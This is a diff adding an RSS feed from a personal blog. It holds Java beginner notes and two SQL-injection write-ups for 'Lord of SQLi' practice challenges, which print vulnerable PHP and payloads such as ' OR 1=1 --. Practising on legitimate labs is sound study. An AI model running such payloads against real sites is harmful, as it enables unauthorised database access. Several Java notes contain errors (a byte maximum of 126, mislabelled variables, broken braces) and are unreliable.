@@ -1,0 +1,776 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Seif-Allah's Blog</title>
+    <description>“I wanted to save the world.”</description>
+    <link>/seifallahhomrani1.github.io/</link>
+    <atom:link href="/seifallahhomrani1.github.io/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Wed, 20 Jan 2021 21:53:48 +0100</pubDate>
+    <lastBuildDate>Wed, 20 Jan 2021 21:53:48 +0100</lastBuildDate>
+    <generator>Jekyll v4.2.0</generator>
+    
+      <item>
+        <title>Linux - Find Command : Cheat Sheet </title>
+        <description>&lt;script src=&quot;https://gist.github.com/seifallahhomrani1/c3c02887aab8f077690505bfb726d34e.js&quot;&gt;&lt;/script&gt;
+
+</description>
+        <pubDate>Tue, 19 Jan 2021 00:00:00 +0100</pubDate>
+        <link>/seifallahhomrani1.github.io/Find-Command/</link>
+        <guid isPermaLink="true">/seifallahhomrani1.github.io/Find-Command/</guid>
+        
+        
+        <category>Linux</category>
+        
+      </item>
+    
+      <item>
+        <title>Lord Of SQLi : goblin Writeup</title>
+        <description>&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/writeups/los/goblin.png&quot; style=&quot;  width: 100%; max-width: 600px; height: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Previous WriteUp&lt;/strong&gt; : &lt;a href=&quot;/ctf-writeup/2021/01/03/LOS-gremlin.html&quot;&gt;gremlin&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;provided-code&quot;&gt;Provided code&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php 
+  //Challenge Preparation
+  include &quot;./config.php&quot;; 
+  login_chk(); 
+  $db = dbconnect(); 
+  // - - - - - - 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit(&quot;No Hack ~_~&quot;); 
+  if(preg_match('/\'|\&quot;|\`/i', $_GET[no])) exit(&quot;No Quotes ~_~&quot;); 
+  $query = &quot;select id from prob_goblin where id='guest' and no={$_GET[no]}&quot;; 
+  echo &quot;&amp;lt;hr&amp;gt;query : &amp;lt;strong&amp;gt;{$query}&amp;lt;/strong&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;br&amp;gt;&quot;; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if($result['id']) echo &quot;&amp;lt;h2&amp;gt;Hello {$result[id]}&amp;lt;/h2&amp;gt;&quot;; 
+  if($result['id'] == 'admin') solve(&quot;goblin&quot;);
+  highlight_file(__FILE__); 
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;explanation&quot;&gt;Explanation&lt;/h3&gt;
+
+&lt;p&gt;-&amp;gt; &lt;em&gt;Challenge preparation&lt;/em&gt;
+First of all, it includes this php file called &lt;em&gt;config.php&lt;/em&gt;, then it checks if you are logged in or not. After that, it connect to the database.&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;em&gt;no field check&lt;/em&gt; 
+There’s a double check for the &lt;em&gt;no&lt;/em&gt; field, firstly it checks for :&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;em&gt;First REGEX explanation&lt;/em&gt;
+/prob|_|.|()/i
+&lt;strong&gt;1st Alternative prob&lt;/strong&gt;
+prob matches the characters prob literally (case insensitive)
+&lt;strong&gt;2nd Alternative _&lt;/strong&gt;
+_ matches the character _ literally (case insensitive)
+&lt;strong&gt;3rd Alternative .&lt;/strong&gt;
+. matches the character . literally (case insensitive)
+&lt;strong&gt;4th Alternative ()&lt;/strong&gt;
+( matches the character ( literally (case insensitive)
+) matches the character ) literally (case insensitive)
+&lt;strong&gt;Global pattern flags&lt;/strong&gt;
+i modifier: insensitive. Case insensitive match (ignores case of [a-zA-Z])&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;em&gt;Second REGEX explanation&lt;/em&gt;
+/'|&quot;|`/i
+1st Alternative '
+' matches the character ‘ literally (case insensitive)
+2nd Alternative &quot;
+&quot; matches the character “ literally (case insensitive)
+3rd Alternative `
+` matches the character ` literally (case insensitive)
+Global pattern flags
+i modifier: insensitive. Case insensitive match (ignores case of [a-zA-Z])&lt;/p&gt;
+
+&lt;p&gt;Then it executes the final query, and if result id == admin then the problem is solved, else, it returns “Hello {$result[id]}”&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;As mentioned before, we can’t use quotes, but we can use another methods like :&lt;/p&gt;
+
+&lt;h3 id=&quot;substr&quot;&gt;SUBSTR()&lt;/h3&gt;
+&lt;p&gt;The &lt;a href=&quot;https://www.w3schools.com/sql/func_mysql_substr.asp&quot;&gt;SUBSTR()&lt;/a&gt; function extracts a substring from a string (starting at any position). 
+The main idea is that we extract the first character of the id field that matches if it equals 97 (ASCII character of ‘a’).&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;em&gt;Payload&lt;/em&gt; : /?no=0 or ascii(substr(id,1,1))=97&lt;/p&gt;
+
+&lt;h3 id=&quot;order-by&quot;&gt;ORDER BY&lt;/h3&gt;
+&lt;p&gt;If we use this function, SQL will sort data by column according to asc.&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;em&gt;Payload&lt;/em&gt; : /?no=2 or 1 order by id&lt;/p&gt;
+
+&lt;h3 id=&quot;limit-11&quot;&gt;LIMIT 1,1&lt;/h3&gt;
+&lt;p&gt;This function will cut the rows from offset-index to (offset+amount)-index.&lt;/p&gt;
+
+&lt;p&gt;Start of index is 0,0.&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;em&gt;Payload&lt;/em&gt; : /?no=0 or 1 limit 1,1&lt;/p&gt;
+
+&lt;p&gt;Resources : &lt;a href=&quot;https://portswigger.net/support/sql-injection-bypassing-common-filters&quot;&gt;PortSwigger - Bypassing Common filters&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 05 Jan 2021 00:00:00 +0100</pubDate>
+        <link>/seifallahhomrani1.github.io/LOS-goblin/</link>
+        <guid isPermaLink="true">/seifallahhomrani1.github.io/LOS-goblin/</guid>
+        
+        
+        <category>CTF-WriteUp</category>
+        
+      </item>
+    
+      <item>
+        <title>Lord Of SQLi : gremlin Writeup</title>
+        <description>&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/writeups/los/sql1.png&quot; style=&quot;  width: 100%; max-width: 600px; height: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Resources :&lt;/strong&gt; &lt;a href=&quot;/databases/2020/11/24/SQL-Injection.html&quot;&gt;SQL INJECTION - Introduction&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://los.rubiya.kr/&quot;&gt;‘Lord of SQL Injection’&lt;/a&gt;, a site where you can learn about SQL injection vulnerabilities while capturing dungeons. 
+LoS provides 49 stepwise SQLinjection challenges.
+Challenges are about SQLinjection at mysql, sqlite, mssql, mongodb, webapp what protected by WAF.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Site origin Country : Korea&lt;/li&gt;
+  &lt;li&gt;Language : English&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;gremlin&quot;&gt;Gremlin&lt;/h3&gt;
+&lt;p&gt;Given a php code :&lt;/p&gt;
+&lt;hr /&gt;
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt; &amp;lt;?php
+  include &quot;./config.php&quot;;
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit(&quot;No Hack ~_~&quot;); // do not try to attack another table, database!
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit(&quot;No Hack ~_~&quot;);
+  $query = &quot;select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'&quot;;
+  echo &quot;&amp;lt;hr&amp;gt;query : &amp;lt;strong&amp;gt;{$query}&amp;lt;/strong&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;br&amp;gt;&quot;;
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['id']) solve(&quot;gremlin&quot;);
+  highlight_file(__FILE__);
+?&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h3 id=&quot;explanation&quot;&gt;Explanation&lt;/h3&gt;
+
+&lt;p&gt;-&amp;gt; &lt;em&gt;Challenge preparation&lt;/em&gt;
+First of all, it includes this php file called &lt;em&gt;config.php&lt;/em&gt;, then it checks if you are logged in or not. After that, it connect to the database.&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;em&gt;The fun begins&lt;/em&gt;
+&lt;a href=&quot;https://www.php.net/manual/en/function.preg-match.php&quot;&gt;preg_match&lt;/a&gt; is a php function that performs a regular expression match. If the provided regex found in the &lt;em&gt;id&lt;/em&gt; or &lt;em&gt;pw&lt;/em&gt; fields it exits with “No Hack ~_~” message?&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; &lt;em&gt;REGEX explanation&lt;/em&gt;
+/prob|_|.|()/i
+&lt;strong&gt;1st Alternative prob&lt;/strong&gt;
+prob matches the characters prob literally (case insensitive)
+&lt;strong&gt;2nd Alternative _&lt;/strong&gt;
+_ matches the character _ literally (case insensitive)
+&lt;strong&gt;3rd Alternative .&lt;/strong&gt;
+. matches the character . literally (case insensitive)
+&lt;strong&gt;4th Alternative ()&lt;/strong&gt;
+( matches the character ( literally (case insensitive)
+) matches the character ) literally (case insensitive)
+&lt;strong&gt;Global pattern flags&lt;/strong&gt;
+i modifier: insensitive. Case insensitive match (ignores case of [a-zA-Z])&lt;/p&gt;
+
+&lt;p&gt;Then, with the provided &lt;em&gt;id&lt;/em&gt; and &lt;em&gt;pw&lt;/em&gt;, the SQL query is ready to be executed, and it is printed out using the following &lt;em&gt;echo&lt;/em&gt;. 
+Using the &lt;a href=&quot;https://www.php.net/manual/en/mysqli-result.fetch-array.php&quot;&gt;mysqli_fetch_array&lt;/a&gt; function, which fetch a result row as an associative, a numeric array, or both.&lt;/p&gt;
+
+&lt;p&gt;Finally, it checks if the id has a value, if it has, the challenge is solved !&lt;/p&gt;
+
+&lt;p&gt;I just want to mention that the &lt;em&gt;id&lt;/em&gt; and &lt;em&gt;pw&lt;/em&gt; field are gonna be passed in the url like this : ?id=
+If you’ve read my article mentioned above, you can solve this challenge easily by closing the id field using an apostrophe then executing a condition that returns true as a result like 1=1. 
+So the final result will be : 
+?id=’ OR 1=1 
+Then we need to comment out the &lt;em&gt;pw&lt;/em&gt; field so we insert a double dash followed by a space (Black Space = %20 : URL encoding) or a hashtag(hashtag = %23 : URL encoding )
+?id=’ OR 1=1 –%20
+So the final query will be  :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;select id from prob_gremlin where id='' OR 1=1 -- ' and pw=''
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;GREMLIN CLEAR !&lt;/p&gt;
+</description>
+        <pubDate>Sun, 03 Jan 2021 00:00:00 +0100</pubDate>
+        <link>/seifallahhomrani1.github.io/LOS-gremlin/</link>
+        <guid isPermaLink="true">/seifallahhomrani1.github.io/LOS-gremlin/</guid>
+        
+        
+        <category>CTF-WriteUp</category>
+        
+      </item>
+    
+      <item>
+        <title>Java - OOP Concepts</title>
+        <description>&lt;p&gt;Basically, the Java control statements are the same as in C language.&lt;/p&gt;
+
+&lt;h3 id=&quot;if-else-statement&quot;&gt;if-else statement&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public class Java_Nested_if{
+    public static void main(String[] args){
+        int age = 25; 
+        int weight = 48; 
+
+
+        if (age&amp;gt;=18){
+            if (weight&amp;gt;50){
+                System.out.println(&quot;You can donate blood&quot;);
+            }
+            else{
+                System.out.println(&quot;Go eat some fucking food&quot;);
+            }
+        else{
+            System.out.println(&quot;Sorry lil boy, go play with your toys&quot;);
+        }
+        }
+    }
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;switch-statement&quot;&gt;Switch statement&lt;/h3&gt;
+
+&lt;p&gt;The switch statement tests the equality of a variable against multiple values.&lt;/p&gt;
+
+&lt;p&gt;Rules :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;There can be one or N number of case values for a switch expression.&lt;/li&gt;
+  &lt;li&gt;The case value must be of switch expression type only. The case value must be literal or constant. It doesn”t allow variables.&lt;/li&gt;
+  &lt;li&gt;The case values must be unique. In case of duplicate value, it renders compile-time error.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Switch statement example:
+```java&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;public class SwitchExample2{
+    public static void main(String[] args){&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    int number = 20; 
+
+    switch(number){
+        case 10 : System.out.println(&quot;10&quot;);
+        case 20: System.out.println(&quot;20&quot;);
+        case 30 : System.out.println(&quot;30&quot;);
+        default : System.out.println(&quot;Not in 10, 20,30&quot;);
+    }
+
+
+} }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;```&lt;/p&gt;
+</description>
+        <pubDate>Mon, 28 Dec 2020 00:00:00 +0100</pubDate>
+        <link>/seifallahhomrani1.github.io/control-statements/</link>
+        <guid isPermaLink="true">/seifallahhomrani1.github.io/control-statements/</guid>
+        
+        
+        <category>Java</category>
+        
+      </item>
+    
+      <item>
+        <title>Java - Variables</title>
+        <description>&lt;h3 id=&quot;java-variables&quot;&gt;Java Variables&lt;/h3&gt;
+
+&lt;p&gt;A variable is a container which holds the value while the Java Program is executed. A variable is assigned with a data type.&lt;/p&gt;
+
+&lt;p&gt;Variable is a name of memory location. There are three types of variables in java: local, instance and static.&lt;/p&gt;
+
+&lt;p&gt;There are two types of data types in Java: primitive and non-primitive.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Local Variable&lt;/strong&gt;
+A variable declared inside the body of the method is called local variable. You can use this variable only within that method and the other methods in the class aren’t even aware that the variable exists.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;A local variable cannot be defined with static keyword.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Instance Variable&lt;/strong&gt;
+A variable declared inside the class but outside the body of the method, is called instance variable. 
+It is not declared as static.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;It is called instance variable because its value is instance specific and is not shared among instances.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Static Variable&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;A variable which is declared as static is called static variable. It cannot be local. You can create a single copy of static variable and share among all the instances of the class . Memory allocation for static variable happens only once when the class is loaded in the memory.&lt;/p&gt;
+
+&lt;h4 id=&quot;example-to-understand-the-types-of-variables-in-java&quot;&gt;Example to understand the types of variables in Java&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;class A {
+    int data=50; //instance variable
+    static int m=100; // static variable
+
+
+    void method(){
+        int n=90; //local variable
+    }
+} //end of class
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&quot;java-variable-example--add-two-numbers&quot;&gt;Java Variable Example : Add Two Numbers&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;class Simple{
+    public static void main(String[] args){
+        int a=10; //a is an instance variable
+        int b=10; //b is an instance variable
+        int c=a+b; 
+        System.out.println(c);
+    }   
+}
+
+Output : 20
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&quot;java-variable-example--widening&quot;&gt;Java Variable Example : Widening&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;class Simple{
+    public static void main(String[] args){
+        int a=10; 
+        float f=a;
+        System.out.println(a);
+        System.out.println(f);
+        
+    }
+}
+
+Output : 
+10
+10.0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;java-variable-example-narrowing-typecasting&quot;&gt;Java Variable Example: Narrowing (Typecasting)&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;class simple{
+    public static void main(String[] args){
+        float f=10.5f; //f is placed after value because by default value is double, so to tell the compiler to treat is as float explicitly we use f or F
+        int a=f; // This will give a runtime error
+        int a = (int)f; // This is typecasting
+        System.out.println(f); 
+        System.out.println(a); 
+
+    }
+}
+
+Output : 
+10.5
+10
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;java-variable-example--overflow&quot;&gt;Java Variable Example : Overflow&lt;/h4&gt;
+
+&lt;p&gt;Overflow occurs when we assign such a value to a variable which is more than the maximum permissible value.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;class Simple{
+    public static void main(String[] args){
+        //Overflow
+        int a=130; 
+        byte b = (byte)a; //Max Value of byte is 126  
+        System.out.println(a);
+        System.out.println(b);
+    }
+}
+
+Output : 
+130
+-126
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&quot;java-variable-example--adding-lower-type&quot;&gt;Java Variable Example : Adding Lower Type&lt;/h4&gt;
+
+&lt;p&gt;```java
+class Simple{
+    public static void main(String[] args){
+        byte a = 10; 
+        byte b = 10; 
+        byte c = a+b; // Compile Time Error : because a+b will be int 
+        byte c = (byte)(a+b);
+        System.out.println(c);
+    }
+}&lt;/p&gt;
+
+&lt;p&gt;Output :
+20&lt;/p&gt;
+</description>
+        <pubDate>Mon, 28 Dec 2020 00:00:00 +0100</pubDate>
+        <link>/seifallahhomrani1.github.io/Java-Variables/</link>
+        <guid isPermaLink="true">/seifallahhomrani1.github.io/Java-Variables/</guid>
+        
+        
+        <category>Java</category>
+        
+      </item>
+    
+      <item>
+        <title>Java - JVM Architecture</title>
+        <description>&lt;p&gt;JVM contains classloader, memory area, execution engine etc.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/java/jvm-architecture.png&quot; alt=&quot;JVM Architecture&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;classloader&quot;&gt;Classloader&lt;/h3&gt;
+
+&lt;p&gt;Classloader is a subsystem of JVM which is used to load class files. Whenever we run the java program, it is loaded first by the classloader. There are three built-in classloaders in Java.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Bootstrap Class Loader&lt;/strong&gt;: This is the first classloader which is the super class of Extension classloader. It loads the rt.jar file which contains all class files of Java Standard Edition like java.lang package classes, java.net package classes, java.util package classes. java.io package classes, java.sql package classes etc.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Extension ClassLoader&lt;/strong&gt;: This is the child classloader of Bootstrap and parent classloader of System classloader. It loader the jar files located inside $JAVA_HOME/jre/lib/ext directory.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;System/Application ClassLoader&lt;/strong&gt;: This is the child classloader of Extension classloader. It loads the classfiles from classpath. By default, classpath is set to current directory. You can change the classpath using ‘-cp’ or ‘-classpath’ switch. It is also know as Application classloader.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Class(Method) Area&lt;/strong&gt;
+Class(Method) Area stores per-class structures such as the runtime constant pool, field and method data, the code for methods.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Heap&lt;/strong&gt;
+It is the runtime data area in which objects are allocated.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Stack&lt;/strong&gt;
+Java Stack stores frames. It holds local variables and partial results, and plays a part in method invocation and return. 
+Each thread has a private JVM stack, created at the same time as thread. 
+A new frame is created each time a method in invoked. A frame is destroyed when its method invocation completes.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Program Counter Register&lt;/strong&gt;
+PC (program counter) register contains the address of the Java virtual machine instruction currently being executed.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Native Method Stack&lt;/strong&gt;
+It contains all the native methods used in the application.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Execution Engine&lt;/strong&gt;
+It contains:&lt;/li&gt;
+  &lt;li&gt;A virtual processor&lt;/li&gt;
+  &lt;li&gt;Interpreter : Read bytecode stream then execute the instructions.&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Just-In-Time(JIT) compiler: It is used to improve the performance. JIT compiles parts of the byte code that have similar functionality at the same time, and hence reduces the amount of time needed for compilation. Here, the term “compiler” refers to a translator from the instruction set of a JVM to the instruction set of a specific CPU.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Java Native Interface
+Java Native Interface (JNI) is a framework which provides an interface to communicate with another application written in another language like C, C++, Assembly etc. Java uses JNI framework to send output to the Console or interact with OS libraries.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Resources : https://www.javatpoint.com/jvm-java-virtual-machine&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 28 Dec 2020 00:00:00 +0100</pubDate>
+        <link>/seifallahhomrani1.github.io/JVM-architecture/</link>
+        <guid isPermaLink="true">/seifallahhomrani1.github.io/JVM-architecture/</guid>
+        
+        
+        <category>Java</category>
+        
+      </item>
+    
+      <item>
+        <title>Java - Clickable Pen program</title>
+        <description>&lt;p&gt;Following &lt;a href=&quot;https://www.youtube.com/channel/UC_fFL5jgoCOrwAVoM_fBYwA&quot;&gt;Alex Lee&lt;/a&gt; video about object oriented programming, I wrote this basic OOP program which create a pen as an object and two methods that click and unclick the pen.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/j0lBrYSlYaU&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+&lt;/p&gt;
+
+&lt;p&gt;The source can be found in my github directory : &lt;a href=&quot;https://github.com/seifallahhomrani1/Java&quot;&gt;JAVA - OOP&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 28 Dec 2020 00:00:00 +0100</pubDate>
+        <link>/seifallahhomrani1.github.io/First-Java-program/</link>
+        <guid isPermaLink="true">/seifallahhomrani1.github.io/First-Java-program/</guid>
+        
+        
+        <category>Java</category>
+        
+      </item>
+    
+      <item>
+        <title>Java - JDK, JRE and JVM</title>
+        <description>&lt;p&gt;Notes:&lt;/p&gt;
+
+&lt;p&gt;JVM, JRE, and JDK are platform dependent because the configuration of each OS is different from each other. However Java is platform independent.&lt;/p&gt;
+
+&lt;h4 id=&quot;jvm&quot;&gt;JVM&lt;/h4&gt;
+&lt;p&gt;JVM (Java Virtual Machine) is an abstract machine.
+It is a specification that provides a runtime environment in Which Java bytecode can be executed.
+It can also run those programs which are written in other languages and compiled to Java bytecode.&lt;/p&gt;
+
+&lt;p&gt;JVMs are availbale for many hardware and software platforms.&lt;/p&gt;
+
+&lt;p&gt;The JVM performs the following main tasks :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Loads code&lt;/li&gt;
+  &lt;li&gt;Verifies code&lt;/li&gt;
+  &lt;li&gt;Executes code&lt;/li&gt;
+  &lt;li&gt;Provides runtime environment&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;jre&quot;&gt;JRE&lt;/h4&gt;
+&lt;p&gt;JRE (Java Runtime Environment) is a set of software tools which are used for developing Java applications. It is used to provide the runtime environment. It contains a set of libraries + other files that JVM uses at runtime.&lt;/p&gt;
+
+&lt;h4 id=&quot;jdk&quot;&gt;JDK&lt;/h4&gt;
+
+&lt;p&gt;JDK is an acronym for Java Development Kit. The Java Development Kit is a software development environment which is used to develop Java applications and applets.
+It physically exists. It contains JRE + development tools.&lt;/p&gt;
+
+&lt;p&gt;Resources : https://www.javatpoint.com/difference-between-jdk-jre-and-jvm&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 28 Dec 2020 00:00:00 +0100</pubDate>
+        <link>/seifallahhomrani1.github.io/Difference-between-JDK,-JRE-and-JVM/</link>
+        <guid isPermaLink="true">/seifallahhomrani1.github.io/Difference-between-JDK,-JRE-and-JVM/</guid>
+        
+        
+        <category>Java</category>
+        
+      </item>
+    
+      <item>
+        <title>Java - Data Types</title>
+        <description>&lt;p&gt;Java is &lt;em&gt;statically-typed&lt;/em&gt; programming language.&lt;/p&gt;
+
+&lt;p&gt;Data types specify the different sizes and values that be stored in the variable. There are two types of data types in Java :&lt;/p&gt;
+
+&lt;h3 id=&quot;java-primitive-data-types&quot;&gt;Java Primitive Data Types&lt;/h3&gt;
+
+&lt;p&gt;There are 8 types of primitive data types  :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;boolean false&lt;/li&gt;
+  &lt;li&gt;byte 0&lt;/li&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;char ‘\u0000’&lt;/td&gt;
+          &lt;td&gt;Java uses 2 byte because it uses Unicode system instead of ASCII code system and the \u0000 is the lowest range of unicode system.&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;short 0&lt;/li&gt;
+  &lt;li&gt;int 0&lt;/li&gt;
+  &lt;li&gt;long 0L&lt;/li&gt;
+  &lt;li&gt;float 0.0f&lt;/li&gt;
+  &lt;li&gt;double 0.0d&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;java-operators&quot;&gt;Java Operators&lt;/h3&gt;
+
+&lt;p&gt;There are many types of operators in Java which are given below :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;Unary Operator  (expr++ / expr–&lt;/td&gt;
+          &lt;td&gt;++expr / –expr&lt;/td&gt;
+          &lt;td&gt;~(bitwise complement) !)&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Arithmetic Operator (* / % + -)&lt;/li&gt;
+  &lt;li&gt;Shift (The Java left shift operator « is used to shift all of the bits in a value to the left side of a specified number of times.)&lt;/li&gt;
+  &lt;li&gt;Relational (Comparison &amp;amp; equality)&lt;/li&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;Bitwise (&amp;amp; ^&lt;/td&gt;
+          &lt;td&gt;)&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Logical (AND, OR)&lt;/li&gt;
+  &lt;li&gt;Ternary ( ? : )&lt;/li&gt;
+  &lt;li&gt;Assignment (short + short = int : Compile Time Error -&amp;gt; Solution : TypeCasting)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;unicode-system&quot;&gt;Unicode System&lt;/h3&gt;
+
+&lt;p&gt;Unicode is a universal international standard character encoding that is capable of representing most the world’s written languages.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Why java uses Unicode system ?&lt;/strong&gt;
+Before Unicode, there were many language standards:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;ASCII (American Standard Code for Information Interchange) for the United States.&lt;/li&gt;
+  &lt;li&gt;ISO 8859-1 for Western European Language.&lt;/li&gt;
+  &lt;li&gt;KOI-8 for Russian.&lt;/li&gt;
+  &lt;li&gt;GB18030 and BIG-5 for chinese.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This caused two major problems which is :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;A particular code value corresponds to different letters in the various language standards.&lt;/li&gt;
+  &lt;li&gt;The encodings for languages with large character sets have variable length. Some common characters are encoded as single bytes, other require two or more byte.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The solution for those problems is the Unicode System.
+The lowest value : \u0000
+The highest value : \uFFFF&lt;/p&gt;
+
+&lt;p&gt;Resources : https://www.javatpoint.com/java-data-types&lt;/p&gt;
+</description>
+        <pubDate>Mon, 28 Dec 2020 00:00:00 +0100</pubDate>
+        <link>/seifallahhomrani1.github.io/Data-Types/</link>
+        <guid isPermaLink="true">/seifallahhomrani1.github.io/Data-Types/</guid>
+        
+        
+        <category>Java</category>
+        
+      </item>
+    
+      <item>
+        <title>TryHackMe: Chill Hack WriteUp - PART 1</title>
+        <description>&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+&lt;p&gt;Classic Nmap scan :&lt;/p&gt;
